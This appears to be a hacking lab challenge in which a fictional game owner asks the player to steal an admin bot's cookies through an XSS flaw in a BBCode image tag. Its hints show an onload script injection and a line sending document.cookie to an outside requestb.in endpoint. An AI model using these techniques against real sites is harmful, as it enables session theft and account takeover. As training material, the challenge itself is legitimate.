# XSS/CSRF Challenge 4

----------------------

Hey friend,

I have a new concern I'm hoping you can help me with.

I had a user recently complain to me that his account got hacked. Apparently the hacker found something in my BBCode parser he was able to exploit to do an XSS attack and steal this user's cookie, then login as him.

Can you see if you can duplicate that attack?

Just like the previous challenge, I have a phantomjs bot setup that will log in as my admin account and visit all user profiles in the game. To trigger it, just go to Trigger Admin Browser in the navigation. See if you can steal that account's cookies!

Thanks!

-Breakthenet Game Owner

----------------------

Stuck? 
----------------------
<details> 
  <summary>Click for hint 1</summary>
   BBCode allows you to embed an image like so: ```[img]http://url.com/image.jpg[/img]```
   
   Play around with that.
</details>

<details> 
  <summary>Click for hint 2</summary>
   Try breaking the BBCode image tag by inserting other characters (besides the url) inside of it. Use chrome inspector or view-source on "My Profile" to see what your BBCode input looks like when it's translated into html.
</details>

<details> 
  <summary>Click for hint 3</summary>
   Did you know you can execute javascript when an image loads? It's simple! All you have to do is use the onLoad attribute, like so:
   
   ```
   <img src="logo.png" onload="alert(1)">
   ```
   
</details>

<details> 
  <summary>Click for hint 4</summary>
   http://requestb.in/ is a neat site for testing webhooks. Cookie stealing is kind of like a webhook. If you were somehow able to get javascript execution, you could potentially change the SRC of the image to something like this:
   
   ```
   http://requestb.in/1fj9x6o1?c='+document.cookie
   ```
   
   And then review the cookie (passed as a GET parameter) on requestb.in!
</details>

<details> 
  <summary>Click for hint 5</summary>
   While you can edit cookies with plain javascript, you can also cheat and use a browser extension like [this one](https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg?hl=en).
</details>




